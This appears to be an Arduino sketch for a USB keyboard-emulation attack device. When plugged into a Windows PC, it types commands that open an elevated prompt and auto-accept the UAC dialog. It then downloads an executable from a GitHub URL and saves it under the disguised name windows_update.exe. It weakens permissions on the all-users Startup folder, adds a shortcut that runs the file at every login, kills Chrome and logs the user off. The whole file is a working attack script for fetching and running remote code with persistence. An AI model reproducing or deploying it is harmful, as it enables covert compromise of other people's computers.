#include "Keyboard.h"
#define  MENU_KEY 0xED
//
void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
//
/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();
//
  // Wait 500ms
  delay(500);

  // ducky script for downloading a file from github and executing it as a process assuming that the user is an admin
  // plus adding a shortcut which will run even if the user shuts down or restarts computer
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print(F("powershell  Start-Process cmd -Verb RunAs"));

  typeKey(KEY_RETURN);

  delay(3500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(600);

  Keyboard.print(F("cd \"%USERPROFILE%\\Desktop\""));

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print(F("powershell"));

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print(F("$wc=New-Object System.Net.Webclient"));

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print(F("$wc.DownloadFile(\"https://github.com/smallmacy/Cyber_Project/raw/master/final.exe\",\"windows_update.exe\")"));

  typeKey(KEY_RETURN);

  delay(10000);

  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);
  
  

  delay(400);
  Keyboard.print(F("Icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\" /grant Everyone:(OI)(CI)F /T"));

  typeKey(KEY_RETURN);
  delay(150);


  // This will allow everyone full acess over Startup directory, which is nessecary to run the shortcut
  // Script for shortcut:
  Keyboard.print(F("cd \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""));

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print(F("start ."));

  typeKey(KEY_RETURN);

  delay(1500);

  Keyboard.press(MENU_KEY);

  Keyboard.releaseAll();

  Keyboard.print(F("w"));
  
  
  Keyboard.print(F("s"));

  typeKey(KEY_RETURN);
  delay(1500);
  Keyboard.print(F("C:\\Windows\\System32\\cmd.exe /min /c \"set __COMPAT_LAYER=RUNASINVOKER && start \"\" %USERPROFILE%\\Desktop\\windows_update.exe\""));

  typeKey(KEY_RETURN);

  delay(600);

  Keyboard.print(F("test"));

  typeKey(KEY_RETURN);

  delay(900);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('w');
  Keyboard.releaseAll();
  delay(300);

  Keyboard.print(F("exit"));
  typeKey(KEY_RETURN);
  delay(200);
  
  // Kills chrome
  Keyboard.print(F("TSKILL chrome"));
  typeKey(KEY_RETURN);
  delay(100);
  //Keyboard.print(F("exit"));
  //typeKey(KEY_RETURN);
  //delay(200);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('x');
  Keyboard.releaseAll();

  delay(100);
  
  Keyboard.print(F("u"));

  delay(100);

  //Keyboard.print(F("u"));

  // the program is running as a process!

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
